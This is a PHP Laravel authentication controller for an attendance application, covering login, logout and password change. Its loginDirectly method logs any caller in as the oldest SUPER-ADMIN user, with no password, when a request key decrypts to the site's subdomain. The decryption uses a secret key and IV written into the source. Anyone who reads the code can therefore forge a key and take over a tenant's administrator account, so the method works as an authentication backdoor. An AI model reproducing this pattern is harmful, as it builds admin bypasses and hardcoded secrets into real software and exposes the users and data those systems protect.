<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Session;
use Illuminate\Support\Facades\Hash;

class Authcontroller extends Controller
{
    public function showLoginForm()
    {
        if (Auth::check()) {
            return redirect()->route('dashboard');
        }
        return view('auth.login');
    }

    public function login(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        $credentials = $request->only('email', 'password');
        if (Auth::attempt($credentials)) {
            $user = Auth::user();

            if ($user->roles->isEmpty()) {
                Auth::logout();
                return redirect("login")->withError('You are not authorized to access this system.');
            }

            return redirect()->intended('dashboard');
        }

        return redirect("login")->withError('Oppes! You have entered invalid credentials');
    }

    public function logout()
    {
        Session::flush();
        Auth::logout();

        return Redirect('login');
    }

    public function changePassword()
    {
        return view('auth.profile');
    }

    public function updatePassword(Request $request)
    {
        $request->validate([
            'current_password' => ['required', 'string'],
            'new_password' => ['required', 'string', 'min:8', 'confirmed'],
        ]);
        // Check if the current password matches the authenticated user's password
        if (!Hash::check($request->current_password, Auth::user()->password)) {
            return back()->withErrors(['current_password' => 'The current password is incorrect.']);
        }

        // Update the password
        Auth::user()->update([
            'password' => Hash::make($request->new_password),
        ]);


        // Redirect with a success message
        return redirect()->back()->with('message', 'Password changed successfully.');
    }

    public function loginDirectly(Request $request)
    {
        $key = request('key');
        $value = $this->encryptOrDecrypt($key);
        $companyCode = $this->getCompanyCode();
        if ($companyCode === $value) {
            $user = User::oldest()
                ->whereHas('roles', function ($query) {
                    $query->where('name', 'SUPER-ADMIN');
                })
                ->first();

            if (!$user) {
                return redirect()->away('https://sajiloattendance.com');
            }

            Auth::login($user);

            return redirect()->route('dashboard');
        } else {
            return redirect()->away('https://sajiloattendance.com');
        }
    }

    protected function encryptOrDecrypt($string, $action = 'decrypt')
    {
        try {
            $cipher = "AES-256-CBC";
            $secretKey = "drgm.sajilo@098";

            $key = hash('sha256', $secretKey, true);
            $iv = substr(hash('sha256', $secretKey . '_iv'), 0, 16);

            if ($action === 'encrypt') {
                $encrypted = openssl_encrypt($string, $cipher, $key, 0, $iv);
                return base64_encode($encrypted);
            } elseif ($action === 'decrypt') {
                $encrypted = base64_decode($string);
                return openssl_decrypt($encrypted, $cipher, $key, 0, $iv);
            } else {
                return false;
            }
        } catch (Exception $error) {
            return false;
        }
    }

    public function getCompanyCode()
    {
        try {
            $host = request()->fullUrl() ?? null;
            $host = parse_url($host, PHP_URL_HOST) ?? null;
            $parts = explode('.', $host) ?? [];
            return $parts[0] ?? null;
        } catch (Exception $error) {
            return null;
        }
    }
}
